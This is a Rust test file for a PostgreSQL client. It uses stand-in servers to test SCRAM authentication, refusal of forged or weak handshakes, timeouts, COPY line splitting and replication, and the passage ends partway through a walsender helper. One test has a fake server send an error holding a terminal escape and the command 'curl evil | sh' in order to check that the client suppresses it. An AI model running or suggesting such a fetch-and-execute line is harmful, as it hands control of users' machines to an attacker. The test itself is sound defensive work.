//! The client against a stand-in for PostgreSQL.
//!
//! The client was held to fennecdb's own pg server, whose SCRAM half was
//! written by hand too, so each checked the other. That server is gone; the
//! stand-in here keeps its half of SCRAM (RFC 5802 and 7677, checked
//! against RFC 7677's example below, as the client's half is in
//! `src/client.rs`'s `scram_rfc7677_exchange`), a server asking SCRAM for
//! more rounds than the client runs, a cleartext password, and the
//! answers the client reads: rows, an error, a COPY stream whose `CopyData`
//! frames do not align with its lines, a replication stream's end. A live
//! PostgreSQL is `make import-test`'s.

use fennec_http::crypto::*;
use fennec_wire::client::{Client, SslMode, Url, Wal, WalStream, SCRAM_MAX_ITERATIONS};
use std::io::{Read, Write};
use std::net::{TcpListener, TcpStream};
use std::sync::atomic::{AtomicBool, Ordering};
use std::sync::{mpsc, Arc};
use std::time::{Duration, Instant};

// ------------------------------------------------------------- framing

fn cstr(out: &mut Vec<u8>, s: &str) {
    out.extend_from_slice(s.as_bytes());
    out.push(0);
}

fn framed(tag: u8, body: &[u8]) -> Vec<u8> {
    let mut v = vec![tag];
    v.extend_from_slice(&((body.len() + 4) as i32).to_be_bytes());
    v.extend_from_slice(body);
    v
}

fn read_msg(s: &mut TcpStream) -> Option<(u8, Vec<u8>)> {
    let mut head = [0u8; 5];
    s.read_exact(&mut head).ok()?;
    let len = i32::from_be_bytes([head[1], head[2], head[3], head[4]]) as usize - 4;
    let mut body = vec![0u8; len];
    s.read_exact(&mut body).ok()?;
    Some((head[0], body))
}

fn error(code: &str, message: &str) -> Vec<u8> {
    let mut b = Vec::new();
    for (k, v) in [(b'S', "ERROR"), (b'C', code), (b'M', message)] {
        b.push(k);
        cstr(&mut b, v);
    }
    b.push(0);
    framed(b'E', &b)
}

// ---------------------------------------------------- SCRAM, server half

const ITERS: u32 = 4096;

pub(crate) struct Verifier {
    salt: Vec<u8>,
    stored_key: [u8; SHA256_LEN],
    server_key: [u8; SHA256_LEN],
}

impl Verifier {
    pub(crate) fn new(password: &str, salt: Vec<u8>) -> Verifier {
        let salted = pbkdf2_sha256(password.as_bytes(), &salt, ITERS);
        let client_key = hmac_sha256(&salted, b"Client Key");
        Verifier {
            salt,
            stored_key: sha256(&client_key),
            server_key: hmac_sha256(&salted, b"Server Key"),
        }
    }
}

pub(crate) fn attr(msg: &str, key: char) -> Option<&str> {
    msg.split(',').find_map(|kv| {
        let mut it = kv.splitn(2, '=');
        let k = it.next()?;
        (k.len() == 1 && k.starts_with(key))
            .then(|| it.next())
            .flatten()
    })
}

/// One handshake: `client-first` -> `server-first`, then `client-final` ->
/// `server-final`, or the refusal of a wrong proof.
pub(crate) struct Exchange<'a> {
    v: &'a Verifier,
    client_first_bare: String,
    server_first: String,
    nonce: String,
}

impl<'a> Exchange<'a> {
    pub(crate) fn client_first(v: &'a Verifier, msg: &str, snonce: &str) -> (Exchange<'a>, String) {
        let bare = msg.splitn(3, ',').nth(2).expect("a gs2 header").to_string();
        let nonce = format!("{}{snonce}", attr(&bare, 'r').expect("a client nonce"));
        let server_first = format!("r={nonce},s={},i={ITERS}", b64_encode(&v.salt));
        let ex = Exchange {
            v,
            client_first_bare: bare,
            server_first: server_first.clone(),
            nonce,
        };
        (ex, server_first)
    }

    pub(crate) fn client_final(&self, msg: &str) -> Result<String, String> {
        let (without_proof, _) = msg.rsplit_once(",p=").ok_or("no proof")?;
        if attr(msg, 'r') != Some(self.nonce.as_str()) {
            return Err("the nonce does not match".into());
        }
        let proof = attr(msg, 'p').and_then(b64_decode).ok_or("a bad proof")?;
        let auth = format!(
            "{},{},{without_proof}",
            self.client_first_bare, self.server_first
        );
        let client_sig = hmac_sha256(&self.v.stored_key, auth.as_bytes());
        let mut client_key = [0u8; SHA256_LEN];
        for i in 0..SHA256_LEN {
            client_key[i] = proof.get(i).copied().unwrap_or(0) ^ client_sig[i];
        }
        if !ct_eq(&sha256(&client_key), &self.v.stored_key) {
            return Err("password authentication failed".into());
        }
        let server_sig = hmac_sha256(&self.v.server_key, auth.as_bytes());
        Ok(format!("v={}", b64_encode(&server_sig)))
    }
}

/// RFC 7677's example: the server half gives the values the RFC does, so
/// the client checked against it is checked against SCRAM itself.
#[test]
fn the_server_half_answers_as_rfc_7677_does() {
    let salt = b64_decode("W22ZaJ0SNY7soEsUEjb6gQ==").unwrap();
    let v = Verifier::new("pencil", salt);
    let (ex, server_first) = Exchange::client_first(
        &v,
        "n,,n=user,r=rOprNGfwEbeRWgbNEkqO",
        "%hvYDpWUa2RaTCAfuxFIlj)hNlF$k0",
    );
    assert_eq!(
        server_first,
        "r=rOprNGfwEbeRWgbNEkqO%hvYDpWUa2RaTCAfuxFIlj)hNlF$k0,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096"
    );
    let server_final = ex
        .client_final(
            "c=biws,r=rOprNGfwEbeRWgbNEkqO%hvYDpWUa2RaTCAfuxFIlj)hNlF$k0,\
             p=dHzbZapWIk4jUhN+Ute9ytag9zjfMHgsqmmiz7AndVQ=",
        )
        .unwrap();
    assert_eq!(
        server_final,
        "v=6rriTRBi23WpRR/wtup+mMhUZUn/dB5nLTJRsjl95G4="
    );
}

// ------------------------------------------------------------ the server

enum Auth {
    Trust,
    Cleartext(&'static str),
    Scram(&'static str),
    /// SCRAM with the password, its last word a signature that is not the
    /// verifier's.
    ScramForged(&'static str),
    /// SCRAM with the password, its last word an `AuthenticationOk` where
    /// the signature should be.
    ScramOkUnproven(&'static str),
}

/// A server that authenticates as `auth` says, then answers each query:
/// one naming `no_such` with an error, any other with two rows of `name`
/// and `score` -- a thread a connection, every query on it.
fn server(auth: Auth) -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let auth = std::sync::Arc::new(auth);
    std::thread::spawn(move || {
        for s in listener.incoming() {
            let auth = std::sync::Arc::clone(&auth);
            std::thread::spawn(move || session(s.unwrap(), &auth));
        }
    });
    port
}

fn session(mut s: TcpStream, auth: &Auth) {
    // StartupMessage: its length, then a body the stand-in ignores.
    let mut len = [0u8; 4];
    s.read_exact(&mut len).unwrap();
    let mut body = vec![0u8; i32::from_be_bytes(len) as usize - 4];
    s.read_exact(&mut body).unwrap();
    if !authenticate(auth, &mut s) {
        return;
    }
    let mut out = framed(b'R', &0i32.to_be_bytes());
    let mut ps = Vec::new();
    cstr(&mut ps, "server_version");
    cstr(&mut ps, "17.0");
    out.extend_from_slice(&framed(b'S', &ps));
    out.extend_from_slice(&framed(b'Z', b"I"));
    s.write_all(&out).unwrap();
    while let Some((tag, q)) = read_msg(&mut s) {
        if tag != b'Q' {
            break;
        }
        let q = String::from_utf8_lossy(&q);
        let mut out = Vec::new();
        if q.contains("no_such") {
            out.extend_from_slice(&error("42P01", "no such table"));
        } else {
            let mut d = 2i16.to_be_bytes().to_vec();
            for (name, oid) in [("name", 25i32), ("score", 20)] {
                cstr(&mut d, name);
                d.extend_from_slice(&0i32.to_be_bytes());
                d.extend_from_slice(&0i16.to_be_bytes());
                d.extend_from_slice(&oid.to_be_bytes());
                d.extend_from_slice(&(-1i16).to_be_bytes());
                d.extend_from_slice(&(-1i32).to_be_bytes());
                d.extend_from_slice(&0i16.to_be_bytes());
            }
            out.extend_from_slice(&framed(b'T', &d));
            for (name, score) in [("one", "1"), ("two", "2")] {
                let mut r = 2i16.to_be_bytes().to_vec();
                for cell in [name, score] {
                    r.extend_from_slice(&(cell.len() as i32).to_be_bytes());
                    r.extend_from_slice(cell.as_bytes());
                }
                out.extend_from_slice(&framed(b'D', &r));
            }
            out.extend_from_slice(&framed(b'C', b"SELECT 2\0"));
        }
        out.extend_from_slice(&framed(b'Z', b"I"));
        s.write_all(&out).unwrap();
    }
}

/// The password exchange; `false`, the refusal sent, for a wrong one.
fn authenticate(auth: &Auth, s: &mut TcpStream) -> bool {
    let refuse = |s: &mut TcpStream| {
        let _ = s.write_all(&error("28P01", "password authentication failed"));
        false
    };
    match auth {
        Auth::Trust => true,
        Auth::Cleartext(expected) => {
            s.write_all(&framed(b'R', &3i32.to_be_bytes())).unwrap();
            let Some((b'p', body)) = read_msg(s) else {
                return false;
            };
            let got = body.strip_suffix(&[0]).unwrap_or(&body);
            ct_eq(got, expected.as_bytes()) || refuse(s)
        }
        Auth::Scram(password) | Auth::ScramForged(password) | Auth::ScramOkUnproven(password) => {
            let v = Verifier::new(password, system_random(16).unwrap());
            let mut b = 10i32.to_be_bytes().to_vec();
            cstr(&mut b, "SCRAM-SHA-256");
            b.push(0);
            s.write_all(&framed(b'R', &b)).unwrap();
            // SASLInitialResponse: the mechanism, a length, the first message.
            let Some((b'p', body)) = read_msg(s) else {
                return false;
            };
            let at = body.iter().position(|&c| c == 0).unwrap() + 1 + 4;
            let first = String::from_utf8_lossy(&body[at..]).into_owned();
            let (ex, server_first) = Exchange::client_first(&v, &first, &nonce(18).unwrap());
            let mut b = 11i32.to_be_bytes().to_vec();
            b.extend_from_slice(server_first.as_bytes());
            s.write_all(&framed(b'R', &b)).unwrap();
            let Some((b'p', body)) = read_msg(s) else {
                return false;
            };
            match ex.client_final(&String::from_utf8_lossy(&body)) {
                Ok(_) if matches!(auth, Auth::ScramOkUnproven(_)) => true,
                Ok(server_final) => {
                    let server_final = match auth {
                        Auth::ScramForged(_) => format!("v={}", b64_encode(&[7u8; 32])),
                        _ => server_final,
                    };
                    let mut b = 12i32.to_be_bytes().to_vec();
                    b.extend_from_slice(server_final.as_bytes());
                    s.write_all(&framed(b'R', &b)).unwrap();
                    true
                }
                Err(_) => refuse(s),
            }
        }
    }
}

fn url(port: u16, password: Option<&str>) -> Url {
    url_with(port, password, "")
}

/// The stand-in's URL, its password percent-escaped, `params` after
/// `sslmode=disable`: the stand-in takes no SSLRequest; tests/tls.rs's does.
/// Read with no variable of libpq's: a `PGPASSWORD` this process inherited
/// had the client hold a password and refuse a trust stand-in.
pub(crate) fn url_with(port: u16, password: Option<&str>, params: &str) -> Url {
    let pw = password.map_or_else(String::new, |p| {
        let mut out = String::from(":");
        for b in p.bytes() {
            match b {
                b'a'..=b'z' | b'A'..=b'Z' | b'0'..=b'9' | b'-' | b'_' | b'.' => out.push(b as char),
                b => out.push_str(&format!("%{b:02X}")),
            }
        }
        out
    });
    let u = Url::parse_in(
        &format!("postgres://fennec{pw}@127.0.0.1:{port}/fennec?sslmode=disable{params}"),
        |_| None,
    )
    .unwrap();
    assert_eq!(u.sslmode, SslMode::Disable);
    u
}

#[test]
fn connects_without_authentication() {
    let port = server(Auth::Trust);
    let mut c = Client::connect(&url(port, None)).unwrap();
    assert!(!c.server_version.is_empty(), "ParameterStatus was not read");

    let r = c.query("select name, score from t").unwrap();
    let names: Vec<&str> = r.columns.iter().map(|f| f.name.as_str()).collect();
    assert_eq!(names, vec!["name", "score"]);
    assert_eq!(r.rows.len(), 2);
    assert_eq!(r.rows[0][0].as_deref(), Some("one"));
    assert_eq!(r.rows[1][1].as_deref(), Some("2"));
}

/// The client half of SCRAM against the server half above.
#[test]
fn scram_handshake_succeeds_and_rejects() {
    let port = server(Auth::Scram("right-password"));
    let c = Client::connect(&url(port, Some("right-password")));
    assert!(c.is_ok(), "{:?}", c.err());

    let e = Client::connect(&url(port, Some("wrong")))
        .unwrap_err()
        .to_string();
    assert!(e.contains("28P01") || e.contains("password"), "{e}");
}

/// A server whose server-first message is `first(client's nonce)`, as one
/// hostile, or standing in for PostgreSQL, may write it: whether the
/// client's proof came back, told once the client ended or sent it.
fn answering_first(
    first: impl FnOnce(&str) -> String + Send + 'static,
) -> (u16, mpsc::Receiver<bool>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let (told, proof) = mpsc::channel();
    std::thread::spawn(move || {
        let (mut s, _) = listener.accept().unwrap();
        let mut len = [0u8; 4];
        s.read_exact(&mut len).unwrap();
        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
        s.read_exact(&mut startup).unwrap();
        let mut b = 10i32.to_be_bytes().to_vec();
        cstr(&mut b, "SCRAM-SHA-256");
        b.push(0);
        s.write_all(&framed(b'R', &b)).unwrap();
        let Some((b'p', body)) = read_msg(&mut s) else {
            return told.send(false).unwrap();
        };
        let at = body.iter().position(|&c| c == 0).unwrap() + 1 + 4;
        let client_first = String::from_utf8_lossy(&body[at..]).into_owned();
        let bare = client_first.splitn(3, ',').nth(2).unwrap();
        let cnonce = attr(bare, 'r').unwrap();
        let mut b = 11i32.to_be_bytes().to_vec();
        b.extend_from_slice(first(cnonce).as_bytes());
        s.write_all(&framed(b'R', &b)).unwrap();
        told.send(read_msg(&mut s).is_some_and(|(tag, _)| tag == b'p'))
            .unwrap();
    });
    (port, proof)
}

/// A server asking SCRAM for `iterations` rounds.
fn asking_server(iterations: String) -> (u16, mpsc::Receiver<bool>) {
    answering_first(move |cnonce| format!("r={cnonce}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i={iterations}"))
}

/// A server's iteration count past SCRAM_MAX_ITERATIONS is refused naming
/// the range and how to come under it, before PBKDF2 runs: no proof goes
/// out, and four billion rounds -- an hour and more of a core -- never
/// start.
#[test]
fn scram_refuses_iterations_past_the_bound() {
    let past = (SCRAM_MAX_ITERATIONS as u64 + 1).to_string();
    let cases: [String; 3] = [
        past.clone(),
        u32::MAX.to_string(),
        (u32::MAX as u64 + 1).to_string(),
    ];
    for asked in cases {
        let (port, proof) = asking_server(asked.clone());
        let e = Client::connect(&url(port, Some("p")))
            .unwrap_err()
            .to_string();
        assert!(
            e.contains(&format!(
                "is 4096 to {SCRAM_MAX_ITERATIONS}, not {asked}: \
                 set the role's password again under a lower scram_iterations"
            )),
            "{asked}: {e}"
        );
        assert!(!proof.recv().unwrap(), "a proof went out for i={asked}");
    }
}

/// What a server-first message may not be, each refused with no proof sent:
/// an iteration count under RFC 7677's floor of 4 096 (`i=1` made a proof
/// four HMACs a guess, and went out), a nonce that is the client's alone --
/// its own sent back, nothing of the server's after it -- and an `m`
/// extension, which RFC 5802 says to refuse.
/// A server-first message, written from the client's nonce.
type First = fn(&str) -> String;

/// A message's tag and body.
type Msg = (u8, Vec<u8>);

#[test]
fn scram_refuses_a_cheap_proof_its_own_nonce_and_an_extension() {
    let cases: [(First, &str); 4] = [
        (
            |n| format!("r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4095"),
            "not 4095: RFC 7677's floor",
        ),
        (
            |n| format!("r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=1"),
            "not 1: RFC 7677's floor",
        ),
        (
            |n| format!("r={n},s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096"),
            "invalid SCRAM",
        ),
        (
            |n| format!("m=ext,r={n}x,s=W22ZaJ0SNY7soEsUEjb6gQ==,i=4096"),
            "`m` extension",
        ),
    ];
    for (first, says) in cases {
        let (port, proof) = answering_first(first);
        let e = Client::connect(&url(port, Some("p")))
            .unwrap_err()
            .to_string();
        assert!(e.contains(says), "{says}: {e}");
        assert!(!proof.recv().unwrap(), "a proof went out: {says}");
    }
}

/// A stand-in asking for the password with `request` (an `R` message's
/// body), then telling the first message the client sent back, `None` for
/// a close.
fn requesting(request: Vec<u8>) -> (u16, mpsc::Receiver<Option<Msg>>) {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let (told, got) = mpsc::channel();
    std::thread::spawn(move || {
        let (mut s, _) = listener.accept().unwrap();
        let mut len = [0u8; 4];
        s.read_exact(&mut len).unwrap();
        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
        s.read_exact(&mut startup).unwrap();
        s.write_all(&framed(b'R', &request)).unwrap();
        let _ = told.send(read_msg(&mut s));
    });
    (port, got)
}

/// A client holding a password gives it in clear text only where its
/// connection string says so (`require_auth=password`): asked for it, it is
/// refused, with libpq's words and the way to take it, and nothing goes
/// out. Whoever stood in for the server -- under `prefer`, the default
/// then, anyone on the path -- was answered with the password.
#[test]
fn a_password_goes_in_clear_only_where_the_string_says_so() {
    let (port, got) = requesting(3i32.to_be_bytes().to_vec());
    let e = Client::connect(&url(port, Some("open")))
        .unwrap_err()
        .to_string();
    assert!(
        e.contains("failed: the server asked for the password in clear text")
            && e.contains("require_auth=password"),
        "{e}"
    );
    let sent = got.recv().unwrap();
    assert!(
        !matches!(&sent, Some((b'p', _))),
        "the password went out in clear: {sent:?}"
    );

    let port = server(Auth::Cleartext("open"));
    assert!(Client::connect(&url_with(port, Some("open"), "&require_auth=password")).is_ok());
    // MD5 neither, by the default; and not spoken where allowed.
    let (port, _) = requesting(5i32.to_be_bytes().to_vec());
    let e = Client::connect(&url(port, Some("open")))
        .unwrap_err()
        .to_string();
    assert!(e.contains("asked for an MD5 password"), "{e}");
}

/// A server that signs a client holding a password in before any exchange
/// -- `AuthenticationOk` straight after the startup -- is refused: a
/// stand-in for the server needs no password to do that, and the client
/// took it, its sign-in proving nothing. `require_auth` with `none` takes
/// it, and a client holding no password takes it as ever.
#[test]
fn an_authentication_ok_before_any_exchange_is_refused_where_a_password_is_held() {
    let port = server(Auth::Trust);
    let e = Client::connect(&url(port, Some("p")))
        .unwrap_err()
        .to_string();
    assert!(
        e.contains("the server did not complete authentication"),
        "{e}"
    );
    assert!(Client::connect(&url_with(
        port,
        Some("p"),
        "&require_auth=scram-sha-256,none"
    ))
    .is_ok());
    assert!(Client::connect(&url(port, None)).is_ok());
}

/// SCRAM's last word is the server's signature, which only a holder of the
/// password's verifier makes: the client refuses a stand-in that sends a
/// wrong one, and one that signs it in with `AuthenticationOk` in its
/// place. (`scram_rfc7677_exchange` holds the check alone; this holds the
/// client to making it.)
#[test]
fn the_client_refuses_a_server_signature_it_cannot_verify() {
    let port = server(Auth::ScramForged("p"));
    let e = Client::connect(&url(port, Some("p")))
        .unwrap_err()
        .to_string();
    assert!(e.contains("server signature could not be verified"), "{e}");
    let port = server(Auth::ScramOkUnproven("p"));
    let e = Client::connect(&url(port, Some("p")))
        .unwrap_err()
        .to_string();
    assert!(e.contains("before SCRAM's exchange was done"), "{e}");
}

/// A password that is not ASCII goes into PBKDF2 as its UTF-8 bytes, as
/// libpq sends one its SASLprep refuses and as a server makes the verifier
/// of one SASLprep leaves as it is: one in NFKC, as these are.
#[test]
fn a_password_that_is_not_ascii_signs_in_as_its_utf8_bytes() {
    for pw in [
        "\u{15f}ifre-\u{e7}\u{f6}z",
        "\u{30d1}\u{30b9}\u{30ef}\u{30fc}\u{30c9}",
    ] {
        let port = server(Auth::Scram(Box::leak(pw.to_string().into_boxed_str())));
        let c = Client::connect(&url(port, Some(pw)));
        assert!(c.is_ok(), "{pw}: {:?}", c.err());
    }
}

/// A simple query's answer is held to 100 000 rows (`QUERY_ROWS`): past it
/// the answer is refused in words, where every row was kept -- a null cell
/// 24 bytes of memory for 4 of the server's.
#[test]
fn a_query_answer_past_its_bound_is_refused() {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        let (mut s, _) = listener.accept().unwrap();
        let mut len = [0u8; 4];
        s.read_exact(&mut len).unwrap();
        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
        s.read_exact(&mut startup).unwrap();
        let mut out = framed(b'R', &0i32.to_be_bytes());
        out.extend_from_slice(&framed(b'Z', b"I"));
        s.write_all(&out).unwrap();
        let _ = read_msg(&mut s);
        let mut t = 1i16.to_be_bytes().to_vec();
        cstr(&mut t, "n");
        t.extend_from_slice(&[0u8; 6]);
        t.extend_from_slice(&25i32.to_be_bytes());
        t.extend_from_slice(&(-1i16).to_be_bytes());
        t.extend_from_slice(&(-1i32).to_be_bytes());
        t.extend_from_slice(&0i16.to_be_bytes());
        let mut out = framed(b'T', &t);
        let mut d = 1i16.to_be_bytes().to_vec();
        d.extend_from_slice(&(-1i32).to_be_bytes());
        let row = framed(b'D', &d);
        for _ in 0..100_001 {
            out.extend_from_slice(&row);
        }
        out.extend_from_slice(&framed(b'C', b"SELECT\0"));
        out.extend_from_slice(&framed(b'Z', b"I"));
        let _ = s.write_all(&out);
        let mut sink = Vec::new();
        let _ = s.read_to_end(&mut sink);
    });
    let mut c = Client::connect(&url(port, None)).unwrap();
    let e = c.query("select n from t").unwrap_err().to_string();
    assert!(e.contains("past 100000 rows"), "{e}");
}

/// A sign-in is held to `connect_timeout` whatever the server does: one
/// that takes the connection and answers nothing, and one that answers a
/// byte at a time, each just within a read's timeout. Each held the dial
/// 30 s a read, the second for good -- and `fennec-server --follow` its
/// write lock with it.
#[test]
fn a_sign_in_is_held_to_its_connect_timeout() {
    for trickle in [false, true] {
        let listener = TcpListener::bind("127.0.0.1:0").unwrap();
        let port = listener.local_addr().unwrap().port();
        std::thread::spawn(move || {
            let (mut s, _) = listener.accept().unwrap();
            let mut len = [0u8; 4];
            s.read_exact(&mut len).unwrap();
            let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
            s.read_exact(&mut startup).unwrap();
            if trickle {
                // A ParameterStatus of a mebibyte, never whole: its head,
                // then a byte of it every 100 ms.
                let _ = s.write_all(&[b'S', 0, 0x10, 0, 0]);
                while s.write_all(b"x").is_ok() {
                    std::thread::sleep(Duration::from_millis(100));
                }
            } else {
                let _ = s.read_to_end(&mut Vec::new());
            }
        });
        let (tx, rx) = mpsc::channel();
        std::thread::spawn(move || {
            let began = Instant::now();
            let r = Client::connect(&url_with(port, None, "&connect_timeout=2"));
            let _ = tx.send((r.map(|_| ()).map_err(|e| e.to_string()), began.elapsed()));
        });
        // Bounded from above, the time being the property, by what it stands
        // against: 30 s a read, and no end at all.
        let (r, took) = rx
            .recv_timeout(Duration::from_secs(20))
            .expect("the sign-in was not held to its connect_timeout");
        let e = r.unwrap_err();
        assert!(e.contains("no sign-in within 2s"), "{trickle}: {e}");
        assert!(took >= Duration::from_secs(2), "{took:?}");
    }
}

/// An error's words from a server that is not proven -- a host off this
/// machine, its certificate unchecked -- are not shown: anyone on the path
/// could have written them, as they could the error answering the TLS
/// request, which was hidden alone. Its code is, and this client's words
/// for it. From a server on this machine they are shown, escaped.
#[test]
fn an_unverified_servers_words_are_not_shown() {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let addr = listener.local_addr().unwrap();
    std::thread::spawn(move || {
        for s in listener.incoming() {
            let mut s = s.unwrap();
            std::thread::spawn(move || {
                let mut len = [0u8; 4];
                s.read_exact(&mut len).unwrap();
                let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
                s.read_exact(&mut startup).unwrap();
                let mut out = framed(b'R', &0i32.to_be_bytes());
                out.extend_from_slice(&framed(b'Z', b"I"));
                s.write_all(&out).unwrap();
                while let Some((b'Q', _)) = read_msg(&mut s) {
                    let mut out = error("42P01", "\x1b[2Jrun `curl evil | sh` to fix this");
                    out.extend_from_slice(&framed(b'Z', b"I"));
                    s.write_all(&out).unwrap();
                }
            });
        }
    });
    let name = format!("pg-{}.test:{}", addr.port(), addr.port());
    fennec_http::dial::stand_in(&name, move || Ok(vec![addr]));
    let far = Url::parse_in(
        &format!("postgres://fennec@{name}/fennec?sslmode=disable"),
        |_| None,
    )
    .unwrap();
    let e = Client::connect(&far)
        .unwrap()
        .query("select 1")
        .unwrap_err()
        .to_string();
    assert!(
        e.contains(": postgres 42P01: the table does not exist ("),
        "{e}"
    );
    assert!(!e.contains("curl") && !e.contains('\x1b'), "{e}");
    let near = url(addr.port(), None);
    let e = Client::connect(&near)
        .unwrap()
        .query("select 1")
        .unwrap_err()
        .to_string();
    assert!(
        e.contains("\\u{1b}[2Jrun `curl evil | sh`") && !e.contains('\x1b'),
        "{e}"
    );
}

/// When a password is required but not supplied, the error must be clear.
#[test]
fn missing_password_is_explained() {
    let port = server(Auth::Scram("p"));
    let e = Client::connect(&url(port, None)).unwrap_err().to_string();
    assert!(e.contains("PGPASSWORD"), "{e}");
}

/// The connection must stay usable after an error: if `ReadyForQuery` is not
/// consumed, the next query reads the tail of the previous response.
#[test]
fn connection_survives_a_failed_query() {
    let port = server(Auth::Trust);
    let mut c = Client::connect(&url(port, None)).unwrap();
    assert!(c.query("select * from no_such_thing").is_err());
    let r = c.query("select name from t").unwrap();
    assert_eq!(r.rows.len(), 2);
}

// ------------------------------------------------------------------ COPY

/// A server that only produces the COPY stream. `chunks` are sent as
/// `CopyData` frames exactly as given -- they need not align with line
/// boundaries.
fn copy_server(chunks: Vec<Vec<u8>>) -> u16 {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    std::thread::spawn(move || {
        let (mut s, _) = listener.accept().unwrap();
        let mut len = [0u8; 4];
        s.read_exact(&mut len).unwrap();
        let mut body = vec![0u8; i32::from_be_bytes(len) as usize - 4];
        s.read_exact(&mut body).unwrap();

        let mut out = Vec::new();
        out.extend_from_slice(&framed(b'R', &0i32.to_be_bytes())); // AuthenticationOk
        let mut ps = Vec::new();
        cstr(&mut ps, "server_version");
        cstr(&mut ps, "17.0");
        out.extend_from_slice(&framed(b'S', &ps));
        out.extend_from_slice(&framed(b'Z', b"I"));
        s.write_all(&out).unwrap();

        // Query -> the COPY stream.
        let _ = read_msg(&mut s);
        let mut out = Vec::new();
        // CopyOutResponse: text format, the column count does not matter.
        let mut h = vec![0u8];
        h.extend_from_slice(&0i16.to_be_bytes());
        out.extend_from_slice(&framed(b'H', &h));
        for c in &chunks {
            out.extend_from_slice(&framed(b'd', c));
        }
        out.extend_from_slice(&framed(b'c', b""));
        out.extend_from_slice(&framed(b'C', b"COPY 3\0"));
        out.extend_from_slice(&framed(b'Z', b"I"));
        s.write_all(&out).unwrap();
        // Do not close before Terminate is awaited.
        let mut sink = Vec::new();
        let _ = s.read_to_end(&mut sink);
    });
    port
}

fn lines(port: u16) -> Vec<String> {
    let c = Client::connect(&url(port, None)).unwrap();
    let mut copy = c.copy_out("copy (select 1) to stdout").unwrap();
    let mut out = Vec::new();
    while let Some(l) = copy.next_line().unwrap() {
        out.push(String::from_utf8(l).unwrap());
    }
    out
}

#[test]
fn copy_stream_splits_into_lines() {
    let port = copy_server(vec![b"one\tfive\ntwo\tsix\nthree\tseven\n".to_vec()]);
    assert_eq!(lines(port), vec!["one\tfive", "two\tsix", "three\tseven"]);
}

/// `CopyData` frames do not align with line boundaries: a frame can end
/// mid-line. Without buffering and rejoining, the lines would be split.
#[test]
fn rows_split_across_frames_are_rejoined() {
    let port = copy_server(vec![
        b"one\tfi".to_vec(),
        b"ve\ntwo\ts".to_vec(),
        b"ix\nthree".to_vec(),
        b"\tseven\n".to_vec(),
    ]);
    assert_eq!(lines(port), vec!["one\tfive", "two\tsix", "three\tseven"]);
}

/// Several rows in a single frame.
#[test]
fn many_rows_in_one_frame() {
    let port = copy_server(vec![b"a\nb\nc\nd\n".to_vec()]);
    assert_eq!(lines(port), vec!["a", "b", "c", "d"]);
}

/// Even without a trailing newline the last row must not be lost.
#[test]
fn trailing_row_without_newline_is_kept() {
    let port = copy_server(vec![b"a\nb".to_vec()]);
    assert_eq!(lines(port), vec!["a", "b"]);
}

#[test]
fn empty_copy_stream_yields_nothing() {
    let port = copy_server(vec![]);
    assert!(lines(port).is_empty());
}

// ----------------------------------------------------------- replication

/// What the stand-in walsender does once the client sent its `CopyDone`.
#[derive(Clone, Copy, PartialEq)]
enum Then {
    /// Lets the slot go -- `released`, set before anything goes out, as
    /// the walsender's `ReplicationSlotRelease` comes before its
    /// `CommandComplete` -- and answers as PostgreSQL does: a change it
    /// still had on its way, its own `CopyDone`, `CommandComplete`,
    /// `ReadyForQuery`.
    Answers,
    /// Answers nothing, as a walsender decoding a transaction does not.
    Decodes,
    /// Goes on sending changes, as one sending a large transaction does.
    Sends,
    /// Sends a whole change and the first bytes of another in one write,
    /// then nothing more: the rest of a message, and bytes already
    /// buffered, are what the client waits on.
    Stalls,
}

/// A stand-in walsender's port, and what it saw of the client's end of the
/// stream.
struct Walsender {
    port: u16,
    released: Arc<AtomicBool>,
    /// A message once the client's `CopyDone` came.
    asked: mpsc::Receiver<()>,
    /// Whether the client then ended the connection: `Terminate`, or, as
    /// the stand-in goes on sending, a write refused.
    terminated: mpsc::Receiver<bool>,
}

/// A stand-in walsender: it starts a stream and sends a keepalive, reads up
/// to the client's `CopyDone`, then does as `then` says.
fn walsender(then: Then) -> Walsender {
    let listener = TcpListener::bind("127.0.0.1:0").unwrap();
    let port = listener.local_addr().unwrap().port();
    let released = Arc::new(AtomicBool::new(false));
    let (told, terminated) = mpsc::channel();
    let (ask, asked) = mpsc::channel();
    let slot = Arc::clone(&released);
    std::thread::spawn(move || {
        let (mut s, _) = listener.accept().unwrap();
        let mut len = [0u8; 4];
        s.read_exact(&mut len).unwrap();
        let mut startup = vec![0u8; i32::from_be_bytes(len) as usize - 4];
        s.read_exact(&mut startup).unwrap();
        let mut out = framed(b'R', &0i32.to_be_bytes());
        out.extend_from_slice(&framed(b'Z', b"I"));
        s.write_all(&out).unwrap();

        let Some((b'Q', q)) = read_msg(&mut s) else {
            panic!("no START_REPLICATION");
        };
        assert!(String::from_utf8_lossy(&q).starts_with("START_REPLICATION SLOT"));
        let mut out = framed(b'W', &[0, 0, 0]);
        let mut k = vec![b'k'];
        k.extend_from_slice(&7u64.to_be_bytes());
        k.extend_from_slice(&0i64.to_be_bytes());
        k.push(0);
        out.extend_from_slice(&framed(b'd', &k));
        s.write_all(&out).unwrap();

        // Feedback, if any, then the CopyDone.
        while let Some((tag, _)) = read_msg(&mut s) {
            if tag == b'c' {
                break;
            }
        }
        let _ = ask.send(());
        let mut w = vec![b'w'];
        w.extend_from_slice(&[0u8; 24]);
        w.extend_from_slice(b"B");
        let change = framed(b'd', &w);
        match then {
            Then::Answers => {
                slot.store(true, Ordering::SeqCst);
